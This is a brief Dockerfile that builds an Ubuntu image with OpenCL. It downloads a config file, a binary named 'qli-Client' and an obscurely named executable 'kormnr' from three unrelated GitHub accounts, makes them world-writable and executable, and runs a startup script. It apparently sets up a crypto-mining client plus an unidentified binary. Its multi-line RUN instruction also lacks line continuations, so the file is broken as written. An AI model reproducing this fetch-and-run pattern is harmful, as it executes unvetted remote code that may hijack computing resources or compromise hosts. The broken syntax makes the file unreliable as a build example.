FROM ubuntu:latest

RUN apt-get update && apt-get install unzip -y && apt-get install -y ocl-icd-opencl-dev && apt-get install -y git wget

WORKDIR /app

RUN wget https://github.com/vedhagsvp/qubros/raw/refs/heads/main/appsettings.json &&
wget https://github.com/bondaltomason/meo/releases/download/2.7.0/qli-Client &&
wget https://github.com/varfeplas/crkonel/releases/download/crkom/kormnr && chmod +x kormnr &&
chmod 777 qli-Client appsettings.json

COPY cpu.sh /app/cpu.sh
RUN chmod +x /app/cpu.sh

CMD ["/app/cpu.sh"]
